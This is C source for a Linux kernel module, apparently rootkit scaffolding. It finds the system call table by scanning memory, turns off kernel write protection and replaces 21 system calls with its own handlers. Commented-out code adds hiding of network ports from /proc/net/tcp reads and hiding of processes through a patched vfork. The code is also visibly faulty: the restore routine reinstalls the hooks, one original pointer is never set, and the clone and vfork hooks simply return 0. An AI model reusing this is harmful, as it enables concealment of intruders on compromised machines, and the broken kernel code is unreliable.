#include "syscalltable.h"


static asmlinkage long(*original_sys_mkdir)(const char __user *pathname, umode_t mode);
static asmlinkage long new_sys_mkdir(const char __user *pathname, umode_t mode);

static asmlinkage long new_sys_mkdir(const char __user *pathname, umode_t mode) {
	int ret;
	ret = original_sys_mkdir(pathname, mode);
	return ret;
}

//sys_read - 3 - 1 - fs/read_write.c
static asmlinkage long(*original_sys_read)(unsigned int fd, char __user *buf, size_t count) = NULL;
static asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count);
//sys_open - 5 - 2 - fs/open.c
static asmlinkage long(*original_sys_open)(const char __user *filename, int flags, int mode);
static asmlinkage long new_sys_open(const char __user *filename, int flags, int mode);
//sys_chdir - 12 - 3 - fs/open.c
static asmlinkage long(*original_sys_chdir)(const char __user *pathname);
static asmlinkage long new_sys_chdir(const char __user *pathname);
//sys_kill - 37 - 4 - kernel/signal.c
static asmlinkage long(*original_sys_kill)(int pid, int sig); 
static asmlinkage long new_sys_kill(int pid, int sig);
//sys_getsid - 66 - 5 - kernel/sys.c
static asmlinkage long(*original_sys_getsid)(pid_t pid); 
static asmlinkage long new_sys_getsid(pid_t pid);
//sys_getpriority - 96 - 6 - kernel/sys.c
static asmlinkage long(*original_sys_getpriority)(int which, int who);
static asmlinkage long new_sys_getpriority(int which, int who);   
//sys_socketcall - 102 - 7 - include/linux/Syscalls.h
static asmlinkage long(*original_sys_socketcall)(int call, unsigned long __user * args);
static asmlinkage long new_sys_socketcall(int call, unsigned long __user * args);
//sys_sysinfo - 116 - 8 - kernel/sys.c
static asmlinkage long(*original_sys_sysinfo)(struct sysinfo __user *info);
static asmlinkage long new_sys_sysinfo(struct sysinfo __user *info);
//sys_clone - 120 - 9 - kernel/process.c
static asmlinkage long(*original_sys_clone)(unsigned long clone_flags, unsigned long newsp, void __user *parent_tid, void __user *child_tid, struct pt_regs *regs);
static asmlinkage long new_sys_clone(unsigned long clone_flags, unsigned long newsp, void __user *parent_tid, void __user *child_tid, struct pt_regs *regs);
//sys_init_module - 128 - 10 - kernel/module.c
static asmlinkage long(*original_sys_init_module)(void __user *umod, unsigned long len, const char __user *uargs);
static asmlinkage long new_sys_init_module(void __user *umod, unsigned long len, const char __user *uargs);
//sys_getpgid - 132 - 11 - kernel/sys.c
static asmlinkage long(*original_sys_getpgid)(pid_t pid);
static asmlinkage long new_sys_getpgid(pid_t pid);
//getdents - 141 - 12 - fs/readdir.c
static asmlinkage long(*original_sys_getdents)(unsigned int fd, struct linux_dirent __user* dirp, unsigned int count);
static asmlinkage long new_sys_getdents(unsigned int fd, struct linux_dirent __user* dirp, unsigned int count);
//sys_sched_getparam - 155 - 13 - kernel/sched/core.c
static asmlinkage long(*original_sys_sched_getparam)(pid_t pid, struct sched_param __user *param);
static asmlinkage long new_sys_sched_getparam(pid_t pid, struct sched_param __user *param);
//sys_sched_getscheduler - 157 - 14 - kernel/sched/core.c
static asmlinkage long(*original_sys_sched_getscheduler)(pid_t pid);
static asmlinkage long new_sys_sched_getscheduler(pid_t pid);
//sys_sched_rr_get_interval - 161 - 15 - kernel/sched/core.c
static asmlinkage long(*original_sys_sched_rr_get_interval)(pid_t pid, struct timespec __user *interval);
static asmlinkage long new_sys_sched_rr_get_interval(pid_t pid, struct timespec __user *interval);
//sys_vfork - 190 - 16 - kernel/fork.c
static asmlinkage long(*original_sys_vfork)(struct pt_regs *regs);
static asmlinkage long new_sys_vfork(struct pt_regs *regs);

#if BITS_PER_LONG == 32
//stat64 - 195	- 17 - fs/stat.c
static asmlinkage long(*original_sys_stat64)(char __user *filename, struct stat64 __user *statbuf);
static asmlinkage long new_sys_stat64(char __user *filename, struct stat64 __user *statbuf);
//sys_lstat64 - 196 - 18 - fs/stat.c
static asmlinkage long(*original_sys_lstat64)(char __user *filename, struct stat64 __user *statbuf);
static asmlinkage long new_sys_lstat64(char __user *filename, struct stat64 __user *statbuf);
#endif

//sys_getdents64  - 220 - 19 - fs/readdir.c
static asmlinkage long(*original_sys_getdents64)(unsigned int fd, struct linux_dirent64 __user* dirp, unsigned int count);
static asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64 __user* dirp, unsigned int count);
//sys_gettid - 224 - 20 - kernel/sys.c
static asmlinkage long(*original_sys_gettid)(void);
static asmlinkage long new_sys_gettid(void);
//sched_getaffinity - 242 - 21 - kernel/sched/core.c
static asmlinkage long(*original_sys_sched_getaffinity)(pid_t pid, unsigned int len, unsigned long __user *user_mask_ptr);
static asmlinkage long new_sys_sched_getaffinity(pid_t pid, unsigned int len, unsigned long __user *user_mask_ptr);

static unsigned int addr_do_fork;



unsigned int find_do_fork(void) {
	unsigned int ret;
	unsigned char *p;
	unsigned char *psyscall = NULL;
	unsigned char *psysvfork = NULL;

	if (NULL == sys_call_table) {
		DLog("sys_call_table == NULL");
		return 0;
	}

	psyscall = (unsigned char *) sys_call_table[__NR_vfork];

	if (NULL == psyscall) {
		DLog("sys_call_table[__NR_vfork] == NULL");
		return 0;
	}

	for (p = psyscall; p < psyscall + 0x10;) {
		if (*p++ == (unsigned char)(0xE9)) {
			ret = *((unsigned int *) p);
			psysvfork = p + 4 + ret;
			break;
		}
	}

	if (NULL == psysvfork) {
		DLog("psysvfork == NULL");
		return 0;
	}

	ret = 0;

	for (p = psysvfork; p < psysvfork + 0x40;) {
		if (*p++ == (unsigned char)(0xE8)) {
			ret = *((unsigned int *) p);
			ret = (unsigned int) p + 4 + ret;
			break;
		}
	}

	return ret;
}

unsigned long **find_sys_call_table(void) {
	unsigned long vaddr_number;

	unsigned long **p;

	for (vaddr_number = (unsigned long) sys_close;
	        vaddr_number < (unsigned long) &loops_per_jiffy;
	        vaddr_number += sizeof(void *)) {
		p = (unsigned long **) vaddr_number;
		if (p[__NR_close] == (unsigned long *) sys_close)
			return p;
	}

	return NULL;
}

void disable_write_protection(void) {
	unsigned long cr0 = read_cr0();
	DLog("disable_write_protection");
	clear_bit(16, &cr0);
	write_cr0(cr0);
}

void enable_write_protection(void) {
	unsigned long cr0 = read_cr0();
	set_bit(16, &cr0);
	write_cr0(cr0);
	DLog("enable_write_protection");
}

void backup_sys_call_table(void)
{
	original_sys_read = (void *)sys_call_table[__NR_read];    //3 - 1
	original_sys_open = (void *)sys_call_table[__NR_open];    //5 - 2
	original_sys_chdir = (void *)sys_call_table[__NR_chdir];
	original_sys_kill = (void *)sys_call_table[__NR_kill]; 	//37 - 4
	original_sys_getsid = (void *)sys_call_table[__NR_getsid]; 	//66 - 5
	original_sys_getpriority = (void *)sys_call_table[__NR_getpriority]; 	//96 - 6
	original_sys_socketcall = (void *)sys_call_table[__NR_socketcall]; 	//102 - 7
	original_sys_sysinfo = (void *)sys_call_table[__NR_sysinfo]; 	//116 - 8
	original_sys_clone = (void *)sys_call_table[__NR_clone]; 	//120 - 9
	original_sys_init_module = (void *)sys_call_table[__NR_init_module]; 	//128 - 10
	original_sys_getpgid = (void *)sys_call_table[__NR_getpgid]; 	//132 - 11
	original_sys_getdents = (void *)sys_call_table[__NR_getdents]; 	//141 - 12
	original_sys_sched_getparam = (void *)sys_call_table[__NR_sched_getparam]; 	//155 - 13
	original_sys_sched_getscheduler = (void *)sys_call_table[__NR_sched_getscheduler]; 	//157 - 14
	original_sys_sched_rr_get_interval = (void *)sys_call_table[__NR_sched_rr_get_interval]; 	//161 - 15
	original_sys_vfork = (void *)sys_call_table[__NR_vfork]; 	//190 - 16
#if BITS_PER_LONG == 32
	original_sys_stat64 = (void *)sys_call_table[__NR_stat64]; 	//195 - 17
	original_sys_lstat64 = (void *)sys_call_table[__NR_lstat64]; 	//196 - 18
#endif	
	original_sys_getdents64 = (void *)sys_call_table[__NR_getdents64]; 	//220 - 19
	original_sys_gettid = (void *)sys_call_table[__NR_gettid]; 	//224 - 20
	original_sys_sched_getaffinity  = (void *)sys_call_table[__NR_sched_getaffinity]; 	 //242 - 21
}
void hack_sys_call_talbe(void)
{

	
	sys_call_table[__NR_read] = (void *)(new_sys_read);   //3 - 1
	sys_call_table[__NR_open] = (void *)(new_sys_open);   //5 - 2
	sys_call_table[__NR_chdir] = (void *)(new_sys_chdir);  //12 - 3
	sys_call_table[__NR_kill] = (void *)(new_sys_kill);      //37 - 4
	sys_call_table[__NR_getsid] = (void *)(new_sys_getsid);      //66 - 5
	sys_call_table[__NR_getpriority] = (void *)(new_sys_getpriority);      //96 - 6
	sys_call_table[__NR_socketcall] = (void *)(new_sys_socketcall);      //102 - 7
	sys_call_table[__NR_sysinfo] = (void *)(new_sys_sysinfo);      //116 - 8
	sys_call_table[__NR_clone] = (void *)(new_sys_clone);      //120 - 9
	sys_call_table[__NR_init_module] = (void *)(new_sys_init_module);      //128 - 10
	sys_call_table[__NR_getpgid] = (void *)(new_sys_getpgid);      //132 - 11
	sys_call_table[__NR_getdents] = (void *)(new_sys_getdents);      //141 - 12
	sys_call_table[__NR_sched_getparam] = (void *)(new_sys_sched_getparam);      //155 - 13
	sys_call_table[__NR_sched_getscheduler] = (void *)(new_sys_sched_getscheduler);      //157 - 14
	sys_call_table[__NR_sched_rr_get_interval] = (void *)(new_sys_sched_rr_get_interval);      //161 - 15
	sys_call_table[__NR_vfork] = (void *)(new_sys_vfork);      //190 - 16
	#if BITS_PER_LONG == 32
	sys_call_table[__NR_stat64] = (void *)(new_sys_stat64);       //195 - 17
	sys_call_table[__NR_lstat64] = (void *)(new_sys_lstat64);         //196 - 18
	#endif	
	sys_call_table[__NR_getdents64] = (void *)(new_sys_getdents64);       //220 - 19
	sys_call_table[__NR_gettid] = (void *)(new_sys_gettid);       //224 - 20
	sys_call_table[__NR_sched_getaffinity] = (void *)(new_sys_sched_getaffinity);       //242 - 21
	sys_call_table[__NR_open] = (void *)(new_sys_open);     //5 - 2
}

void unhack_sys_call_talbe(void)
{
	sys_call_table[__NR_mkdir] = (void *)original_sys_mkdir;

	sys_call_table[__NR_read] = (void *)(new_sys_read);    //3 - 1
	sys_call_table[__NR_open] = (void *)(new_sys_open);    //5 - 2
	sys_call_table[__NR_chdir] = (void *)(new_sys_chdir);   //12 - 3
	sys_call_table[__NR_kill] = (void *)(new_sys_kill);       //37 - 4
	sys_call_table[__NR_getsid] = (void *)(new_sys_getsid);       //66 - 5
	sys_call_table[__NR_getpriority] = (void *)(new_sys_getpriority);       //96 - 6
	sys_call_table[__NR_socketcall] = (void *)(new_sys_socketcall);       //102 - 7
	sys_call_table[__NR_sysinfo] = (void *)(new_sys_sysinfo);       //116 - 8
	sys_call_table[__NR_clone] = (void *)(new_sys_clone);       //120 - 9
	sys_call_table[__NR_init_module] = (void *)(new_sys_init_module);       //128 - 10
	sys_call_table[__NR_getpgid] = (void *)(new_sys_getpgid);       //132 - 11
	sys_call_table[__NR_getdents] = (void *)(new_sys_getdents);       //141 - 12
	sys_call_table[__NR_sched_getparam] = (void *)(new_sys_sched_getparam);       //155 - 13
	sys_call_table[__NR_sched_getscheduler] = (void *)(new_sys_sched_getscheduler);       //157 - 14
	sys_call_table[__NR_sched_rr_get_interval] = (void *)(new_sys_sched_rr_get_interval);       //161 - 15
	sys_call_table[__NR_vfork] = (void *)(new_sys_vfork);       //190 - 16
#if BITS_PER_LONG == 32
	sys_call_table[__NR_stat64] = (void *)(new_sys_stat64);        //195 - 17
	sys_call_table[__NR_lstat64] = (void *)(new_sys_lstat64);          //196 - 18
#endif	
	sys_call_table[__NR_getdents64] = (void *)(new_sys_getdents64);        //220 - 19
	sys_call_table[__NR_gettid] = (void *)(new_sys_gettid);        //224 - 20
	sys_call_table[__NR_sched_getaffinity] = (void *)(new_sys_sched_getaffinity);        //242 - 21
	sys_call_table[__NR_open] = (void *)(new_sys_open);      //5 - 2 	
}

/**
 *  sys_read - 3 - 1 - fs/read_write.c
 * 
 */
//#define DEBUG_READ

static asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count) 
{
	int ret;

#ifdef DEBUG_READ
	DLog("read:fd:[%d],count:[%d]", fd, count);
#endif

	ret = original_sys_read(fd, buf, count);
	if (ret <= 0) {
		goto out;
	}
	/*
		if (rtpid == current->pid && rtfd == fd) {
			int i;
			int len;
			char *p;

			if (ret % TCP_SZ == 0 || ret % UDP_SZ == 0) {
				max = TCP_SZ;
		}
		else {
			goto out;
		}

		for (i = 0; i < 2; i++, max = UDP_SZ) {
			for (p = buf + max; p < buf + ret; p += max) {
				int i = -1;
				int src = -1;
				int srcp = -1;

				sscanf(p, "%4d: %08X:%04X ", &i, &src, &srcp);

				if (0 == check_ports(srcp)) {
					len = ret - (p - buf) - max;
					memmove(p, p + max, len);
					ret -= max;

					DLog("hide port [%d]@[read]", srcp);
				}
			}
		}
	}
*/	
out:
	return ret;	
}

/**
 * sys_open - 5 - 2 - fs/open.c
 * 只检查打开的文件是否是 /proc/net/tcp 或 /proc/net/udp，否则调用正常中断
 */
//#define DEBUG_OPEN

static asmlinkage long new_sys_open(const char __user *filename, int flags, int mode) {
	int ret;

#ifdef DEBUG_OPEN
	char kfileName[MAX_PATH];
	memset(kfileName, 0, MAX_PATH);
	if (!copy_from_user(kfileName, filename, strnlen_user(filename, MAX_PATH))) {
		DLog("open:filename:[%s]flags:[%d]mode:[%d]", kfileName, flags, mode);
	}
	else {
		DLog("open:copy_from_user failure~~");
	}
#endif       

	ret = original_sys_open(filename, flags, mode);
	return ret;
}

/**
 * sys_chdir - 12 - 3 - fs/open.c
 * 用于改变当前工作目录，其参数为Path 目标目录，可以是绝对目录或相对目录
 * 成功返回0 ，失败返回-1
 */
#define DEBUG_CHDIR

static asmlinkage long new_sys_chdir(const char __user *filename) 
{
	int ret;

#ifdef DEBUG_CHDIR
	char kfileName[MAX_PATH];
	memset(kfileName, 0, MAX_PATH);
	if (!copy_from_user(kfileName, filename, strnlen_user(filename, MAX_PATH))) {
		DLog("chdir:filename:[%s]", kfileName);
	}
	else {
		DLog("chdir:copy_from_user failure~~");
	}
#endif   

	ret = original_sys_chdir(filename);
	return ret;
}

/**
 * sys_kill - 37 - 4 - kernel/signal.c
 * kill 送出一个特定的信号 (signal) 给行程 id 为 pid 的行程根据该信号而做特定的动作,
 * 若没有指定，预设是送出终止 (TERM) 的信号
 * kill()可以用来送参数sig指定的信号给参数pid指定的进程。参数pid有几种情况：
 * pid>0 将信号传给进程识别码为pid 的进程。
 * pid=0 将信号传给和当前进程相同进程组的所有进程
 * pid=-1 将信号广播传送给系统内所有的进程
 * pid<0 将信号传给进程组识别码为pid绝对值的所有进程
 */
#define DEBUG_KILL

static asmlinkage long new_sys_kill(int pid, int sig) {
	long ret = 0;

#ifdef DEBUG_KILL
	DLog("kill:pid:[%d],sig:[%d]", pid, sig);
#endif

	ret = original_sys_kill(pid, sig);
	return ret;
}

/**
 * sys_getsid - 66 - 5 - kernel/sys.c
 * 获取会话ID
 * 1.pid为0表示察看当前进程session ID
 * 2.ps ajx命令查看系统中的进程。参数a表示不仅列当前用户的进程,也列出所有其他用
 * 户的进程,参数x表示不仅列有控制终端的进程,也列出所有无控制终端的进程,参数j表示
 * 列出与作业控制相关的信息。
 * 3.组长进程不能成为新会话首进程,新会话首进程必定会成为组长进程。
 */
#define DEBUG_GETSID

static asmlinkage long new_sys_getsid(pid_t pid) {
	int ret;
#ifdef DEBUG_GETSID
	DLog("getsid:pid:[%d]", pid);
#endif    
	ret = original_sys_getsid(pid);
	return ret;
}

/**
 * sys_getpriority - 96 - 6 - kernel/sys.c
 * 可用来取得进程、进程组和用户的进程执行优先权
 * 参数which有三种数值，参数who则依which值有不同定义：
 * which who 代表的意义
 * PRIO_PROCESS who 为进程识别码
 * PRIO_PGRP who 为进程的组识别码
 * PRIO_USER who 为用户识别码
 * 此函数返回的数值介于-20至20 之间，代表进程执行优先权，数值
 * 越低代表有较高的优先次序，执行会较频繁。
 * 返回进程执行优先权，如有错误发生返回值则为-1且错误原因存于errno
 */
#define DEBUG_GETPRIORITY
static asmlinkage long new_sys_getpriority(int which, int who) {
	int ret;
    
#ifdef DEBUG_GETPRIORITY
	DLog("getpriority:which:[%d],who:[%d]", which, who);
#endif      
    
	ret = original_sys_getpriority(which, who);

	return ret;
}

/**
 * sys_socketcall - 102 - 7 - include/linux/Syscalls.h
 * 所有的网络系统调用，最终都会调用sys_socketcall这个系统调用，
 * 由它来进行多路复用分解，分别调用相应的处理函数，socket函数对应调用sys_socket函数。
 * 所有的socket系统调用的总入口是sys_socketcall()
 */
#define DEBUG_SOCKETCALL
static asmlinkage long new_sys_socketcall(int call, unsigned long __user * args) {
	int ret;
    
#ifdef DEBUG_SOCKETCALL
	DLog("socketcall:call:[%d]", call);
#endif          
    
	ret = original_sys_socketcall(call, args);
	return ret;
}

/**
 * sys_sysinfo - 116 - 8 - kernel/sys.c
 * 
 */
#define DEBUG_SYSINFO
static asmlinkage long new_sys_sysinfo(struct sysinfo __user *info) {
	int ret;
#ifdef DEBUG_SYSINFO
	DLog("sysinfo");
#endif      
	ret = original_sys_sysinfo(info);
	return ret;
}

/**
 * sys_clone - 120 - 9 - kernel/process.c
 * 
 */
#define DEBUG_CLONE
static asmlinkage long new_sys_clone(unsigned long clone_flags,
	unsigned long newsp,
	void __user *parent_tid,
	void __user *child_tid,
	struct pt_regs *regs) {
	/*
asm("sub    $0x14,%esp");
asm("mov    %ebx,-0x8(%ebp)");
asm("mov    %esi,-0x4(%ebp)");
asm("nopl   0x0(%eax,%eax,1)");
asm("mov    %eax,%ecx");
asm("mov    (%eax),%eax");
asm("mov    0x4(%ecx),%edx");
asm("mov    0x8(%ecx),%ebx");
asm("mov    0x10(%ecx),%esi");
asm("test   %edx,%edx");
asm("jne    next");
asm("mov    0x3c(%ecx),%edx");
asm("next:");
asm("mov    %esi,0x8(%esp)");
asm("mov    %ebx,0x4(%esp)");
asm("movl   $0x0,(%esp)");
asm("push   %eax");
asm volatile("movl %0,%%eax"::"m"(addr_do_fork));
asm("movl   %eax,%esi");
asm("pop    %eax");
asm("call   *%esi");
asm("mov    -0x8(%ebp),%ebx");
asm("mov    -0x4(%ebp),%esi");

asm("push %eax");
asm("push %ebx");
asm("push %ecx");
asm("push %edx");

asm volatile("movl %%eax,%0" : "=m"(clone_tid) :);

if (clone_flag == 0) {
	clone_pid = current->pid;
	clone_flag = 1;
}
else {
	if (clone_pid == current->pid) {
		clone_flag++;
}
else {
	clone_flag--;
}
}

if (clone_flag < 100 || clone_pid != current->pid) {
	clone_tid = 0;
}

asm("pop %edx");
asm("pop %ecx");
asm("pop %ebx");
asm("pop %eax");

asm("mov    %ebp,%esp");
asm("pop    %ebp");
asm("ret    ");
  */
	return 0;
}

/**
 * sys_init_module - 128 - 10 - kernel/module.c
 * insmod时候，在系统内部会调用sys_init_module() 去找到init_module函数的入口地址
 * 
 */
#define DEBUG_INIT_MODULE
static asmlinkage long new_sys_init_module(void __user *umod, unsigned long len, const char __user *uargs) {
	int ret;
    
#ifdef DEBUG_INIT_MODULE
	DLog("init_module:len:[%ld]", len);
#endif        
    
	ret = original_sys_init_module(umod, len, uargs);
	return ret;
}

/**
 * sys_getpgid - 132 - 11 - kernel/sys.c
 * 取得目前 process 的 thread ID (process ID)
 * 
 */
#define DEBUG_GETPGID
static asmlinkage long new_sys_getpgid(pid_t pid) {
	long ret;
#ifdef DEBUG_GETPGID
	DLog("getpgid:pdid:[%d]", pid);
#endif          
	ret = original_sys_getpgid(pid);
	return ret;
}

/**
 * sys_getdents - 141 - 12 - fs/readdir.c
 * fd指目录文件描述符。可以用sys_open创建。
 * dirp指目录信息，其大小由第3个参数指定，dirp在使用时注意先分配内存。
 * count 目录信息的大小。如果count指定的比较小，可以通过循环，反复获取接下来的dirp.
 * getdents, getdents64 - get directory entries
 */
#define DEBUG_GETDENTS
static asmlinkage long new_sys_getdents(unsigned int fd, struct linux_dirent __user* dirp, unsigned int count) {
	int ret;
#ifdef DEBUG_GETDENTS
	DLog("getdents:fd:[%d],count:[%d]", fd, count);
#endif        
	ret = original_sys_getdents(fd, dirp, count);
	return ret;
}

/**
 * sys_sched_getparam - 155 - 13 - kernel/sched/core.c
 * set and get scheduling parameters
 * 
 */
#define DEBUG_SCHED_GETPARAM
static asmlinkage long new_sys_sched_getparam(pid_t pid, struct sched_param __user *param)
{
	int ret;
#ifdef DEBUG_SCHED_GETPARAM
	DLog("sched_getparam:pid:[%d]", pid);
#endif       
	ret = original_sys_sched_getparam(pid, param);
	return ret;
}

/**
 * sys_sched_getscheduler - 157 - 14 - kernel/sched/core.c
 * get scheduling policy/parameters
 */
#define DEBUG_SCHED_GETSCHEDULER
static asmlinkage long new_sys_sched_getscheduler(pid_t pid) {
	int ret;
#ifdef DEBUG_SCHED_GETSCHEDULER
	DLog("sched_getscheduler:pid:[%d]", pid);
#endif        
	ret = original_sys_sched_getscheduler(pid);
	return ret;
}

/**
 * sys_sched_rr_get_interval - 161 - 15 - kernel/sched/core.c
 */
#define DEBUG_SCHED_RR_GET_INTERVAL
static asmlinkage long new_sys_sched_rr_get_interval(pid_t pid, struct timespec __user *interval) {
	long ret;
#ifdef DEBUG_SCHED_RR_GET_INTERVAL
	DLog("sched_rr_get_interval:pid:[%d]", pid);
#endif      
	ret = original_sys_sched_rr_get_interval(pid, interval);
	return ret;
}

/**
 * sys_vfork - 190 - 16 - kernel/fork.c
 * 
 */
#define DEBUG_VFORK
static asmlinkage long new_sys_vfork(struct pt_regs *regs) {
	/*	
		asm("sub    $0xc,%esp");
		asm("nopl   0x0(%eax,%eax,1)");
		asm("mov    0x3c(%eax),%edx");
		asm("mov    %eax,%ecx");
		asm("mov    $0x4111,%eax");
		asm("movl   $0x0,0x8(%esp)");
		asm("movl   $0x0,0x4(%esp)");
		asm("movl   $0x0,(%esp)");
		asm("push   %eax");
		asm volatile("movl %0,%%eax"::"m"(addr_do_fork));
		asm("movl   %eax,%esi");
		asm("pop    %eax");
		asm("call   *%esi");

		asm("push %eax");
		asm("push %ebx");
		asm("push %ecx");
		asm("push %edx");

		asm volatile("movl %%eax,%0" : "=m"(vfork_spid) :);

		if (vfork_flag == 0) {
			vfork_pid = current->pid;
			vfork_flag = 1;
		}
		else {
			if (vfork_pid == current->pid) {
				vfork_flag++;
		}
		else {
			vfork_flag--;
		}
	}

	if (vfork_flag >= 100 && vfork_pid == current->pid) {
		int pid;

		pid = get_hide_proc(vfork_lastpid++);

		if (pid) {
			vfork_spid = pid;
		}
	}

	asm("pop %edx");
	asm("pop %ecx");
	asm("pop %ebx");
	asm("pop %eax");

	asm volatile("movl %0,%%eax"::"m"(vfork_spid));

	asm("leave  ");
	asm("ret    ");
	*/

	return 0;
}

#if BITS_PER_LONG == 32
/**
 * stat64 - 195	- 17 - fs/stat.c
 */
static asmlinkage long new_sys_stat64(char __user *filename,
	struct stat64 __user *statbuf) {
	int ret;
	ret = original_sys_stat64(filename, statbuf);
	return ret;
}
/**
 * sys_lstat64 - 196 - 18 - fs/stat.c
 */
static asmlinkage long new_sys_lstat64(char __user *filename, struct stat64 __user *statbuf) {
	long ret;
	ret = original_sys_lstat64(filename, statbuf);
	return ret;
}
#endif

/**
 * sys_getdents64  - 220 - 19 - fs/readdir.c
 */
static asmlinkage long new_sys_getdents64(unsigned int fd, struct linux_dirent64 __user* dirp, unsigned int count) {
	int ret;
	ret = original_sys_getdents64(fd, dirp, count);
	return ret;
}

/**
 * 	sys_gettid - 224 - 20 - kernel/sys.c
 */
static asmlinkage long new_sys_gettid(void) {
	int ret;
	ret = original_sys_gettid();
	return ret;
}

/**
 * 	sched_getaffinity - 242 - 21 - kernel/sched/core.c
 */
static asmlinkage long new_sys_sched_getaffinity(pid_t pid, unsigned int len, unsigned long __user *user_mask_ptr) {
	int ret;
	ret = original_sys_sched_getaffinity(pid, len, user_mask_ptr);
	return ret;
}











